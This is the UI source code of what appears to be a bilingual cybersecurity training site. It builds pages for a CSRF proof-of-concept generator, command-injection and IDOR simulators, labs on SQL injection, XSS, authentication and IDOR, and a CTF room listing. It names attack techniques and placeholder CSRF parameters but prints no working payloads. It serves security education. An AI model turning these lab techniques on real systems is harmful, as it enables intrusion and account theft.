              <label class="form-label fw-bold">${txt('URL', 'URL')}</label>
              <input id="cors-url" class="form-control mb-3" placeholder="https://api.example.com/data">
              <button class="btn btn-primary" onclick="testCORS()">
                <i class="fa-solid fa-paper-plane"></i> ${txt('اختبار', 'Test')}
              </button>
              <div class="mt-3">
                <label class="form-label fw-bold">${txt('النتيجة', 'Result')}</label>
                <pre id="cors-output" class="bg-light p-3 rounded border" style="max-height: 300px; overflow-y: auto;"></pre>
              </div>
            </div>
          </div>
        </div>

        <!-- HTTP Client -->
        <div class="tab-pane fade" id="http-client">
          <div class="card shadow-sm">
            <div class="card-header bg-success text-white">
              <h5 class="mb-0"><i class="fa-solid fa-paper-plane"></i> HTTP Client</h5>
            </div>
            <div class="card-body">
              <label class="form-label fw-bold">${txt('الطريقة', 'Method')}</label>
              <select id="http-method" class="form-select mb-3">
                <option>GET</option>
                <option>POST</option>
                <option>PUT</option>
                <option>PATCH</option>
                <option>DELETE</option>
              </select>
              <label class="form-label fw-bold">${txt('URL', 'URL')}</label>
              <input id="http-url" class="form-control mb-3" placeholder="https://api.example.com/endpoint">
              <label class="form-label fw-bold">${txt('Headers (JSON)', 'Headers (JSON)')}</label>
              <textarea id="http-headers" class="form-control mb-3" rows="2" placeholder='{"Content-Type":"application/json"}'></textarea>
              <label class="form-label fw-bold">${txt('Body', 'Body')}</label>
              <textarea id="http-body" class="form-control mb-3" rows="3" placeholder='{"key":"value"}'></textarea>
              <button class="btn btn-success" onclick="httpRequest()">
                <i class="fa-solid fa-paper-plane"></i> ${txt('إرسال', 'Send')}
              </button>
              <div class="mt-3">
                <label class="form-label fw-bold">${txt('الرد', 'Response')}</label>
                <pre id="http-output" class="bg-dark text-light p-3 rounded" style="max-height: 400px; overflow-y: auto;"></pre>
              </div>
            </div>
          </div>
        </div>

        <!-- CSRF Generator -->
        <div class="tab-pane fade" id="csrf-generator">
          <div class="card shadow-sm">
            <div class="card-header bg-warning text-dark">
              <h5 class="mb-0"><i class="fa-solid fa-shield-halved"></i> CSRF PoC Generator</h5>
            </div>
            <div class="card-body">
              <label class="form-label fw-bold">${txt('الطريقة', 'Method')}</label>
              <select id="csrf-method" class="form-select mb-3">
                <option>GET</option>
                <option>POST</option>
              </select>
              <label class="form-label fw-bold">${txt('Action URL', 'Action URL')}</label>
              <input id="csrf-action" class="form-control mb-3" placeholder="http://target.com/transfer">
              <label class="form-label fw-bold">${txt('المعاملات (param1=value1&param2=value2)', 'Parameters (param1=value1&param2=value2)')}</label>
              <input id="csrf-params" class="form-control mb-3" placeholder="amount=1000&to=attacker">
              <button class="btn btn-warning" onclick="generateCSRF()">
                <i class="fa-solid fa-code"></i> ${txt('توليد PoC', 'Generate PoC')}
              </button>
              <div class="mt-3">
                <label class="form-label fw-bold">${txt('CSRF PoC HTML', 'CSRF PoC HTML')}</label>
                <textarea id="csrf-output" class="form-control" rows="10" readonly></textarea>
                <button class="btn btn-sm btn-outline-primary mt-2" onclick="navigator.clipboard.writeText(document.getElementById('csrf-output').value)">
                  <i class="fa-solid fa-copy"></i> ${txt('نسخ', 'Copy')}
                </button>
              </div>
            </div>
          </div>
        </div>

        <!-- Headers Analyzer -->
        <div class="tab-pane fade" id="headers-analyzer">
          <div class="card shadow-sm">
            <div class="card-header bg-info text-white">
              <h5 class="mb-0"><i class="fa-solid fa-server"></i> Security Headers Analyzer</h5>
            </div>
            <div class="card-body">
              <label class="form-label fw-bold">${txt('URL', 'URL')}</label>
              <input id="headers-url" class="form-control mb-3" placeholder="https://example.com">
              <button class="btn btn-info" onclick="analyzeHeaders()">
                <i class="fa-solid fa-search"></i> ${txt('تحليل', 'Analyze')}
              </button>
              <div class="mt-3">
                <label class="form-label fw-bold">${txt('النتيجة', 'Result')}</label>
                <pre id="headers-output" class="bg-light p-3 rounded border" style="max-height: 400px; overflow-y: auto;"></pre>
              </div>
            </div>
          </div>
        </div>

        <!-- URL Encoder -->
        <div class="tab-pane fade" id="url-encoder">
          <div class="card shadow-sm">
            <div class="card-header bg-danger text-white">
              <h5 class="mb-0"><i class="fa-solid fa-link"></i> URL Encoder/Decoder</h5>
            </div>
            <div class="card-body">
              <label class="form-label fw-bold">${txt('النص', 'Text')}</label>
              <textarea id="url-input" class="form-control mb-3" rows="3" placeholder="Enter URL or text..."></textarea>
              <div class="btn-group mb-3" role="group">
                <button class="btn btn-danger" onclick="urlEncode()">
                  <i class="fa-solid fa-lock"></i> ${txt('تشفير', 'Encode')}
                </button>
                <button class="btn btn-outline-danger" onclick="urlDecode()">
                  <i class="fa-solid fa-unlock"></i> ${txt('فك التشفير', 'Decode')}
                </button>
              </div>
              <label class="form-label fw-bold">${txt('النتيجة', 'Result')}</label>
              <textarea id="url-output" class="form-control" rows="3" readonly></textarea>
            </div>
          </div>
        </div>

        <!-- Command Injection Simulator -->
        <div class="tab-pane fade" id="cmd-injection">
          <div class="card shadow-sm">
            <div class="card-header bg-dark text-white">
              <h5 class="mb-0"><i class="fa-solid fa-terminal"></i> Command Injection Simulator</h5>
            </div>
            <div class="card-body">
              <div class="alert alert-warning">
                <i class="fa-solid fa-triangle-exclamation"></i> ${txt('حاول حقن أوامر النظام في خدمة Ping الوهمية', 'Try to inject OS commands into this mock Ping service')}
              </div>
              <label class="form-label fw-bold">${txt('عنوان IP', 'IP Address')}</label>
              <div class="input-group mb-3">
                <span class="input-group-text">ping -c 4</span>
                <input id="cmd-input" class="form-control" placeholder="8.8.8.8">
                <button class="btn btn-dark" onclick="simulateCmdInjection()">
                  <i class="fa-solid fa-play"></i> ${txt('تنفيذ', 'Execute')}
                </button>
              </div>
              <div class="mt-3">
                <label class="form-label fw-bold">${txt('الطرفية (Terminal Output)', 'Terminal Output')}</label>
                <pre id="cmd-output" class="bg-black text-success p-3 rounded" style="min-height: 200px; font-family: monospace;">root@server:~$ _</pre>
              </div>
            </div>
          </div>
        </div>

        <!-- IDOR Simulator -->
        <div class="tab-pane fade" id="idor-sim">
          <div class="card shadow-sm">
            <div class="card-header bg-primary text-white">
              <h5 class="mb-0"><i class="fa-solid fa-users"></i> IDOR Simulator</h5>
            </div>
            <div class="card-body">
              <div class="alert alert-info">
                <i class="fa-solid fa-info-circle"></i> ${txt('أنت مسجل الدخول كمستخدم عادي (ID: 101). حاول الوصول لبيانات مستخدمين آخرين.', 'You are logged in as a normal user (ID: 101). Try to access other users data.')}
              </div>
              <div class="card mb-3">
                <div class="card-body bg-light">
                  <div class="row align-items-center">
                    <div class="col-auto">
                      <img src="assets/avatar.png" class="rounded-circle" width="60" onerror="this.src='https://via.placeholder.com/60'">
                    </div>
                    <div class="col">
                      <h5 class="mb-0">${txt('ملفي الشخصي', 'My Profile')}</h5>
                      <small class="text-muted">User ID: 101</small>
                    </div>
                    <div class="col-auto">
                      <button class="btn btn-outline-primary btn-sm" onclick="loadUserProfile(101)">
                        <i class="fa-solid fa-rotate"></i> ${txt('تحديث', 'Refresh')}
                      </button>
                    </div>
                  </div>
                </div>
              </div>
              
              <hr>
              <label class="form-label fw-bold">${txt('رابط API', 'API Endpoint')}</label>
              <div class="input-group mb-3">
                <span class="input-group-text">GET /api/users/</span>
                <input id="idor-input" class="form-control" value="101" type="number">
                <button class="btn btn-primary" onclick="simulateIDOR()">
                  <i class="fa-solid fa-arrow-right"></i> ${txt('إرسال الطلب', 'Send Request')}
                </button>
              </div>
              
              <div id="idor-result" class="border rounded p-3" style="min-height: 150px; background: #f8f9fa;">
                <div class="text-center text-muted mt-4">${txt('البيانات ستظهر هنا...', 'Data will appear here...')}</div>
              </div>
            </div>
          </div>
        </div>

        <!-- Logic Flaw Shop -->
        <div class="tab-pane fade" id="logic-flaw">
          <div class="card shadow-sm">
            <div class="card-header bg-success text-white">
              <h5 class="mb-0"><i class="fa-solid fa-cart-shopping"></i> Logic Flaw Shop</h5>
            </div>
            <div class="card-body">
              <div class="alert alert-success">
                <i class="fa-solid fa-money-bill"></i> ${txt('لديك رصيد: $100. حاول شراء "Flag" الذي يكلف $1000.', 'You have $100 credit. Try to buy the "Flag" which costs $1000.')}
              </div>
              
              <div class="row g-3">
                <div class="col-md-6">
                  <div class="card h-100 border-warning">
                    <div class="card-body text-center">
                      <i class="fa-solid fa-flag fa-3x text-warning mb-3"></i>
                      <h5>CTF Flag</h5>
                      <p class="text-danger fw-bold">$1000.00</p>
                      <div class="input-group mb-2">
                        <span class="input-group-text">${txt('الكمية', 'Qty')}</span>
                        <input type="number" id="qty-flag" class="form-control" value="1">
                      </div>
                      <button class="btn btn-warning w-100" onclick="buyItem('flag')">${txt('شراء', 'Buy')}</button>
                    </div>
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="card h-100">
                    <div class="card-body text-center">
                      <i class="fa-solid fa-shirt fa-3x text-secondary mb-3"></i>
                      <h5>T-Shirt</h5>
                      <p class="text-dark fw-bold">$20.00</p>
                      <div class="input-group mb-2">
                        <span class="input-group-text">${txt('الكمية', 'Qty')}</span>
                        <input type="number" id="qty-shirt" class="form-control" value="1">
                      </div>
                      <button class="btn btn-secondary w-100" onclick="buyItem('shirt')">${txt('شراء', 'Buy')}</button>
                    </div>
                  </div>
                </div>
              </div>
              
              <div class="mt-4">
                <label class="form-label fw-bold">${txt('سجل المعاملات', 'Transaction Log')}</label>
                <div id="shop-log" class="border rounded p-2 bg-light" style="height: 150px; overflow-y: auto; font-family: monospace; font-size: 0.9rem;"></div>
              </div>
            </div>
          </div>
        </div>


        <!-- WebSocket Client -->
        <div class="tab-pane fade" id="ws-client">
          <div class="card shadow-sm">
            <div class="card-header bg-info text-white">
              <h5 class="mb-0"><i class="fa-solid fa-network-wired"></i> WebSocket Client</h5>
            </div>
            <div class="card-body">
              <div class="input-group mb-3">
                <input id="ws-url" class="form-control" placeholder="wss://echo.websocket.org">
                <button class="btn btn-success" onclick="wsConnect()">${txt('اتصال', 'Connect')}</button>
                <button class="btn btn-danger" onclick="wsClose()">${txt('قطع', 'Disconnect')}</button>
              </div>
              
              <div class="input-group mb-3">
                <input id="ws-message" class="form-control" placeholder="Message...">
                <button class="btn btn-primary" onclick="wsSend()">${txt('إرسال', 'Send')}</button>
              </div>
              
              <label class="form-label fw-bold">${txt('السجل', 'Log')}</label>
              <pre id="ws-log" class="bg-dark text-success p-3 rounded" style="height: 300px; overflow-y: auto;"></pre>
            </div>
          </div>
        </div>

        <!-- Storage Inspector -->
        <div class="tab-pane fade" id="storage-inspector">
          <div class="card shadow-sm">
            <div class="card-header bg-secondary text-white">
              <h5 class="mb-0"><i class="fa-solid fa-hard-drive"></i> Storage Inspector</h5>
            </div>
            <div class="card-body">
              <p class="text-muted">${txt('عرض محتويات التخزين المحلي والجلسة والكوكيز.', 'View LocalStorage, SessionStorage, and Cookies.')}</p>
              <button class="btn btn-secondary mb-3" onclick="inspectStorage()">
                <i class="fa-solid fa-rotate"></i> ${txt('تحديث', 'Refresh')}
              </button>
              <pre id="storage-output" class="bg-light p-3 rounded border" style="max-height: 500px; overflow-y: auto;"></pre>
            </div>
          </div>
      </div>
    </div>
  </div>`;
}
END OF REMOVED PLAYGROUND SECTION */

/* ========== NEW v2.0 PAGES ========== */
function pageLocalLabs() {
  // Get completion stats from localStorage
  const getLabStats = (labId) => {
    const stats = JSON.parse(localStorage.getItem(`lab_${labId}_stats`) || '{"completed": 0, "total": 4}');
    return stats;
  };

  const sqlStats = getLabStats('sql');
  const xssStats = getLabStats('xss');
  const authStats = getLabStats('auth');
  const idorStats = getLabStats('idor');

  const totalCompleted = sqlStats.completed + xssStats.completed + authStats.completed + idorStats.completed;
  const totalChallenges = 16;
  const completionPercentage = Math.round((totalCompleted / totalChallenges) * 100);

  return `
    <div class="container mt-4">
      <style>
        .labs-hero {
          background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
          color: white;
          padding: 50px 30px;
          border-radius: 20px;
          margin-bottom: 30px;
          position: relative;
          overflow: hidden;
        }
        
        .labs-hero::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="rgba(255,255,255,0.03)"/></svg>');
          opacity: 0.1;
        }
        
        .lab-card {
          background: white;
          border-radius: 15px;
          overflow: hidden;
          transition: all 0.3s ease;
          border: 2px solid transparent;
          height: 100%;
        }
        
        .lab-card:hover {
          transform: translateY(-5px);
          box-shadow: 0 15px 40px rgba(0,0,0,0.15);
          border-color: var(--bs-primary);
        }
        
        .lab-header {
          padding: 25px;
          color: white;
          position: relative;
        }
        
        .lab-header.sql { background: linear-gradient(135deg, #667eea, #764ba2); }
        .lab-header.xss { background: linear-gradient(135deg, #ff6b6b, #feca57); }
        .lab-header.auth { background: linear-gradient(135deg, #00d9ff, #6c5ce7); }
        .lab-header.idor { background: linear-gradient(135deg, #f39c12, #e74c3c); }
        
        .lab-icon {
          font-size: 3rem;
          opacity: 0.9;
          margin-bottom: 10px;
        }
        
        .lab-body {
          padding: 25px;
        }
        
        .challenge-badge {
          display: inline-block;
          padding: 5px 12px;
          border-radius: 20px;
          font-size: 0.85rem;
          font-weight: 600;
          margin: 3px;
        }
        
        .badge-easy { background: #d4edda; color: #155724; }
        .badge-medium { background: #fff3cd; color: #856404; }
        .badge-hard { background: #f8d7da; color: #721c24; }
        .badge-expert { background: #d1ecf1; color: #0c5460; }
        
        .progress-ring {
          width: 120px;
          height: 120px;
          margin: 0 auto;
        }
        
        .progress-ring circle {
          transition: stroke-dashoffset 0.5s;
          transform: rotate(-90deg);
          transform-origin: 50% 50%;
        }
        
        .stat-box {
          background: rgba(255,255,255,0.1);
          padding: 20px;
          border-radius: 15px;
          text-align: center;
        }
        
        .stat-box h3 {
          font-size: 2.5rem;
          font-weight: bold;
          margin: 0;
        }
        
        .feature-list {
          list-style: none;
          padding: 0;
        }
        
        .feature-list li {
          padding: 8px 0;
          border-bottom: 1px solid #f0f0f0;
        }
        
        .feature-list li:last-child {
          border-bottom: none;
        }
        
        .feature-list i {
          width: 25px;
          color: var(--bs-success);
        }
      </style>

      <!-- Hero Section -->
      <div class="labs-hero">
        <div class="row align-items-center">
          <div class="col-lg-8">
            <h1 class="display-4 fw-bold mb-3">
              <i class="fa-solid fa-flask-vial me-3"></i>
              ${txt('مختبرات الأمن السيبراني', 'Cybersecurity Labs')}
            </h1>
            <p class="lead mb-4" style="color: rgba(255,255,255,0.8);">
              ${txt('تدرب على أشهر الثغرات الأمنية في بيئة آمنة ومتكاملة. 16 تحدي عملي مع مستويات صعوبة متعددة.', 'Practice the most common security vulnerabilities in a safe, integrated environment. 16 hands-on challenges with multiple difficulty levels.')}
            </p>
            <div class="d-flex gap-3 flex-wrap">
              <div class="stat-box">
                <h3>${totalChallenges}</h3>
                <small>${txt('تحدي', 'Challenges')}</small>
              </div>
              <div class="stat-box">
                <h3>${totalCompleted}</h3>
                <small>${txt('مكتمل', 'Completed')}</small>
              </div>
              <div class="stat-box">
                <h3>${completionPercentage}%</h3>
                <small>${txt('التقدم', 'Progress')}</small>
              </div>
            </div>
          </div>
          <div class="col-lg-4 text-center">
            <svg class="progress-ring" viewBox="0 0 120 120">
              <circle cx="60" cy="60" r="54" stroke="rgba(255,255,255,0.2)" stroke-width="8" fill="none"/>
              <circle cx="60" cy="60" r="54" stroke="#00d9ff" stroke-width="8" fill="none"
                      stroke-dasharray="${2 * Math.PI * 54}"
                      stroke-dashoffset="${2 * Math.PI * 54 * (1 - completionPercentage / 100)}"/>
              <text x="60" y="60" text-anchor="middle" dy="7" font-size="24" font-weight="bold" fill="white">
                ${completionPercentage}%
              </text>
            </svg>
          </div>
        </div>
      </div>

      <!-- Enhanced Labs Grid -->
      <div class="row g-4 mb-5">
        <!-- SQL Injection Lab -->
        <div class="col-lg-6">
          <div class="lab-card">
            <div class="lab-header sql">
              <div class="lab-icon">
                <i class="fa-solid fa-database"></i>
              </div>
              <h3 class="mb-2">SQL Injection Lab</h3>
              <p class="mb-0" style="opacity: 0.9;">
                ${txt('تعلم تقنيات حقن SQL من الأساسيات إلى المستوى المتقدم', 'Learn SQL injection from basics to advanced')}
              </p>
            </div>
            <div class="lab-body">
              <div class="mb-3">
                <strong>${txt('المستويات:', 'Levels:')}</strong><br>
                <span class="challenge-badge badge-easy">Easy - Login Bypass</span>
                <span class="challenge-badge badge-medium">Medium - UNION Attack</span>
                <span class="challenge-badge badge-hard">Hard - Boolean Blind</span>
                <span class="challenge-badge badge-expert">Expert - Time-based</span>
              </div>
              
              <ul class="feature-list mb-4">
                <li><i class="fa-solid fa-check"></i> ${txt('4 مستويات صعوبة', '4 difficulty levels')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('عرض Query المنفذ', 'Live query visualization')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('نظام تلميحات تفاعلي', 'Interactive hints system')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('مخطط قاعدة البيانات', 'Database schema viewer')}</li>
              </ul>
              
              <div class="d-flex gap-2">
                <a href="ctf-apps/sql-injection/index.html" target="_blank" class="btn btn-primary flex-fill">
                  <i class="fa-solid fa-play me-2"></i>${txt('ابدأ التحدي', 'Start Challenge')}
                </a>
                <button class="btn btn-outline-secondary" onclick="alert('Progress: ${sqlStats.completed}/4 completed')">
                  <i class="fa-solid fa-chart-line"></i> ${sqlStats.completed}/4
                </button>
              </div>
            </div>
          </div>
        </div>

        <!-- XSS Practice Lab -->
        <div class="col-lg-6">
          <div class="lab-card">
            <div class="lab-header xss">
              <div class="lab-icon">
                <i class="fa-solid fa-code"></i>
              </div>
              <h3 class="mb-2">XSS Practice Lab</h3>
              <p class="mb-0" style="opacity: 0.9;">
                ${txt('تدرب على جميع أنواع هجمات XSS', 'Practice all types of XSS attacks')}
              </p>
            </div>
            <div class="lab-body">
              <div class="mb-3">
                <strong>${txt('الأنواع:', 'Types:')}</strong><br>
                <span class="challenge-badge badge-easy">Reflected XSS</span>
                <span class="challenge-badge badge-medium">Stored XSS</span>
                <span class="challenge-badge badge-hard">DOM-based XSS</span>
                <span class="challenge-badge badge-expert">Filter Bypass</span>
              </div>
              
              <ul class="feature-list mb-4">
                <li><i class="fa-solid fa-check"></i> ${txt('4 أنواع من XSS', '4 XSS attack types')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('محاكاة سرقة Cookies', 'Cookie stealing simulation')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('أزرار Payloads جاهزة', 'Ready-to-use payloads')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('تنفيذ فوري', 'Instant execution feedback')}</li>
              </ul>
              
              <div class="d-flex gap-2">
                <a href="ctf-apps/xss-practice/index.html" target="_blank" class="btn btn-danger flex-fill">
                  <i class="fa-solid fa-play me-2"></i>${txt('ابدأ التحدي', 'Start Challenge')}
                </a>
                <button class="btn btn-outline-secondary" onclick="alert('Progress: ${xssStats.completed}/4 completed')">
                  <i class="fa-solid fa-chart-line"></i> ${xssStats.completed}/4
                </button>
              </div>
            </div>
          </div>
        </div>

        <!-- Authentication Lab -->
        <div class="col-lg-6">
          <div class="lab-card">
            <div class="lab-header auth">
              <div class="lab-icon">
                <i class="fa-solid fa-lock"></i>
              </div>
              <h3 class="mb-2">Authentication Lab</h3>
              <p class="mb-0" style="opacity: 0.9;">
                ${txt('اكتشف ثغرات المصادقة والجلسات', 'Discover authentication vulnerabilities')}
              </p>
            </div>
            <div class="lab-body">
              <div class="mb-3">
                <strong>${txt('التحديات:', 'Challenges:')}</strong><br>
                <span class="challenge-badge badge-easy">Brute Force</span>
                <span class="challenge-badge badge-medium">Session Hijacking</span>
                <span class="challenge-badge badge-hard">Password Reset</span>
                <span class="challenge-badge badge-expert">JWT Attack</span>
              </div>
              
              <ul class="feature-list mb-4">
                <li><i class="fa-solid fa-check"></i> ${txt('هجوم القوة الغاشمة', 'Brute force attacks')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('اختطاف الجلسات', 'Session hijacking')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('استغلال JWT', 'JWT exploitation')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('تخمين Tokens', 'Token prediction')}</li>
              </ul>
              
              <div class="d-flex gap-2">
                <a href="ctf-apps/weak-password/index.html" target="_blank" class="btn btn-info flex-fill">
                  <i class="fa-solid fa-play me-2"></i>${txt('ابدأ التحدي', 'Start Challenge')}
                </a>
                <button class="btn btn-outline-secondary" onclick="alert('Progress: ${authStats.completed}/4 completed')">
                  <i class="fa-solid fa-chart-line"></i> ${authStats.completed}/4
                </button>
              </div>
            </div>
          </div>
        </div>

        <!-- IDOR Lab -->
        <div class="col-lg-6">
          <div class="lab-card">
            <div class="lab-header idor">
              <div class="lab-icon">
                <i class="fa-solid fa-user-lock"></i>
              </div>
              <h3 class="mb-2">IDOR Lab</h3>
              <p class="mb-0" style="opacity: 0.9;">
                ${txt('استغل ثغرات التحكم بالوصول', 'Exploit access control flaws')}
              </p>
            </div>
            <div class="lab-body">
              <div class="mb-3">
                <strong>${txt('السيناريوهات:', 'Scenarios:')}</strong><br>
                <span class="challenge-badge badge-easy">User Profile</span>
                <span class="challenge-badge badge-medium">Documents</span>
                <span class="challenge-badge badge-hard">API Endpoints</span>
                <span class="challenge-badge badge-expert">UUID Bypass</span>
              </div>
              
              <ul class="feature-list mb-4">
                <li><i class="fa-solid fa-check"></i> ${txt('تغيير IDs', 'ID manipulation')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('الوصول لمستندات محظورة', 'Restricted document access')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('استغلال APIs', 'API exploitation')}</li>
                <li><i class="fa-solid fa-check"></i> ${txt('تخمين UUIDs', 'UUID enumeration')}</li>
              </ul>
              
              <div class="d-flex gap-2">
                <a href="ctf-apps/idor-practice/index.html" target="_blank" class="btn btn-warning flex-fill">
                  <i class="fa-solid fa-play me-2"></i>${txt('ابدأ التحدي', 'Start Challenge')}
                </a>
                <button class="btn btn-outline-secondary" onclick="alert('Progress: ${idorStats.completed}/4 completed')">
                  <i class="fa-solid fa-chart-line"></i> ${idorStats.completed}/4
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Additional Resources -->
      <div class="card shadow-sm border-0 mb-4">
        <div class="card-header bg-dark text-white">
          <h4 class="mb-0"><i class="fa-brands fa-docker me-2"></i>${txt('مختبرات Docker الإضافية', 'Additional Docker Labs')}</h4>
        </div>
        <div class="card-body">
          <div class="alert alert-info">
            <i class="fa-solid fa-info-circle me-2"></i>
            ${txt('المختبرات التالية تتطلب Docker مثبت على جهازك', 'The following labs require Docker installed on your machine')}
          </div>
          
          <div class="row g-3">
            <div class="col-md-6">
              <div class="card h-100">
                <div class="card-body">
                  <h5 class="card-title text-danger">
                    <i class="fa-solid fa-bug me-2"></i>DVWA
                  </h5>
                  <p class="card-text text-muted">
                    ${txt('تطبيق ويب مصاب بثغرات متعددة للتدريب', 'Vulnerable web app for practicing common exploits')}
                  </p>
                  <div class="bg-light p-2 rounded mb-3">
                    <code class="small">docker run --rm -it -p 80:80 vulnerables/web-dvwa</code>
                    <button class="btn btn-sm btn-outline-secondary float-end" onclick="navigator.clipboard.writeText('docker run --rm -it -p 80:80 vulnerables/web-dvwa')">
                      <i class="fa-solid fa-copy"></i>
                    </button>
                  </div>
                  <a href="http://localhost:80" target="_blank" class="btn btn-outline-danger">
                    <i class="fa-solid fa-external-link-alt me-2"></i>${txt('فتح', 'Open')}
                  </a>
                </div>
              </div>
            </div>
            
            <div class="col-md-6">
              <div class="card h-100">
                <div class="card-body">
                  <h5 class="card-title text-warning">
                    <i class="fa-solid fa-shopping-cart me-2"></i>OWASP Juice Shop
                  </h5>
                  <p class="card-text text-muted">
                    ${txt('تطبيق متجر حديث مصاب بثغرات معقدة', 'Modern web shop with complex vulnerabilities')}
                  </p>
                  <div class="bg-light p-2 rounded mb-3">
                    <code class="small">docker run --rm -p 3000:3000 bkimminich/juice-shop</code>
                    <button class="btn btn-sm btn-outline-secondary float-end" onclick="navigator.clipboard.writeText('docker run --rm -p 3000:3000 bkimminich/juice-shop')">
                      <i class="fa-solid fa-copy"></i>
                    </button>
                  </div>
                  <a href="http://localhost:3000" target="_blank" class="btn btn-outline-warning">
                    <i class="fa-solid fa-external-link-alt me-2"></i>${txt('فتح', 'Open')}
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;
}


// Helper functions for CTF rooms
function getRoomById(roomId) {
  if (typeof ctfRooms === 'undefined') return null;
  for (const category in ctfRooms) {
    const room = ctfRooms[category].find(r => r.id === roomId);
    if (room) return room;
  }
  return null;
}

function getAllRooms() {
  if (typeof ctfRooms === 'undefined') return [];
  const allRooms = [];
  for (const category in ctfRooms) {
    allRooms.push(...ctfRooms[category]);
  }
  return allRooms;
}

function pageCTF() {
  if (typeof ctfRooms === 'undefined') {
    return `<div class="container mt-4"><div class="alert alert-danger">Error: CTF Rooms data not loaded. Please refresh the page.</div></div>`;
  }

  const allRooms = getAllRooms();

  // Calculate stats
  const easyCount = allRooms.filter(r => r.difficulty === 'easy').length;
  const mediumCount = allRooms.filter(r => r.difficulty === 'medium').length;
  const hardCount = allRooms.filter(r => r.difficulty === 'hard').length;
  const totalPoints = allRooms.reduce((sum, r) => sum + (r.points || 0), 0);

  // Category icons mapping
  const categoryIcons = {
    web: 'fa-globe',
    crypto: 'fa-lock',
    forensics: 'fa-magnifying-glass',
    osint: 'fa-user-secret',
    network: 'fa-network-wired',
    owasp: 'fa-shield-halved'
  };

  // Simulated leaderboard
  const leaderboard = [
    { name: 'CyberHunter', points: 2450, rank: 1 },
    { name: 'H4ck3rX', points: 2180, rank: 2 },
    { name: 'SecPro', points: 1920, rank: 3 },
    { name: 'NightOwl', points: 1750, rank: 4 },
    { name: 'ByteMaster', points: 1580, rank: 5 }
  ];

  return `
    <div class="container-fluid px-4 mt-4">
      <style>
        /* CTF Page Styles */
        .ctf-hero {
          background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
          border-radius: 24px;
          padding: 60px 40px;
          position: relative;
          overflow: hidden;
          margin-bottom: 2rem;
        }
        .ctf-hero::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239C92AC' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
          animation: pulse 4s ease-in-out infinite;
        }
        @keyframes pulse {
          0%, 100% { opacity: 0.3; }
          50% { opacity: 0.6; }
        }
        .ctf-hero-content {
          position: relative;
          z-index: 1;
        }
        .ctf-title {
          font-size: 3rem;
          font-weight: 800;
          background: linear-gradient(135deg, #00f5a0 0%, #00d9f5 100%);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
          margin-bottom: 1rem;
        }
        .ctf-subtitle {
          color: #a0aec0;
          font-size: 1.2rem;
          max-width: 700px;
          margin: 0 auto 2rem;
        }
        .stat-card-ctf {
          background: rgba(255,255,255,0.05);
          backdrop-filter: blur(10px);
          border: 1px solid rgba(255,255,255,0.1);
          border-radius: 16px;
          padding: 24px;
          text-align: center;
          transition: all 0.3s ease;
        }
        .stat-card-ctf:hover {
          transform: translateY(-5px);
          border-color: rgba(0,245,160,0.3);
          box-shadow: 0 10px 40px rgba(0,245,160,0.1);
        }
        .stat-value {
          font-size: 2.5rem;
          font-weight: 700;
          margin-bottom: 0.5rem;
        }
        .stat-value.green { color: #00f5a0; }
        .stat-value.blue { color: #00d9f5; }
        .stat-value.orange { color: #f5a623; }
        .stat-value.pink { color: #f093fb; }
        .stat-label {
          color: #718096;
          font-size: 0.9rem;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Category Pills */
        .category-pills {
          display: flex;
          gap: 12px;
          flex-wrap: wrap;
          justify-content: center;
          margin-bottom: 2rem;
        }
        .category-pill {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 12px 24px;
          background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.05) 100%);
          border: 1px solid rgba(255,255,255,0.15);
          border-radius: 50px;
          color: #fff;
          cursor: pointer;
          transition: all 0.3s ease;
          font-weight: 500;
        }
        .category-pill:hover, .category-pill.active {
          background: linear-gradient(135deg, #00f5a0 0%, #00d9f5 100%);
          color: #0f0c29;
          border-color: transparent;
          transform: translateY(-2px);
        }
        .category-pill i {
          font-size: 1.1rem;
        }
        .category-pill .count {
          background: rgba(0,0,0,0.2);
          padding: 2px 8px;
          border-radius: 10px;
          font-size: 0.8rem;
        }
        
        /* Challenge Cards */
        .challenge-card {
          background: linear-gradient(145deg, #1e1e30 0%, #16162a 100%);
          border-radius: 20px;
          overflow: hidden;
          border: 1px solid rgba(255,255,255,0.08);
          transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
          height: 100%;
          display: flex;
          flex-direction: column;
          cursor: pointer;
        }
        .challenge-card:hover {
          transform: translateY(-8px) scale(1.02);
          border-color: rgba(0,245,160,0.3);
          box-shadow: 0 20px 60px rgba(0,0,0,0.4), 0 0 40px rgba(0,245,160,0.1);
        }
        .challenge-header {
          padding: 24px;
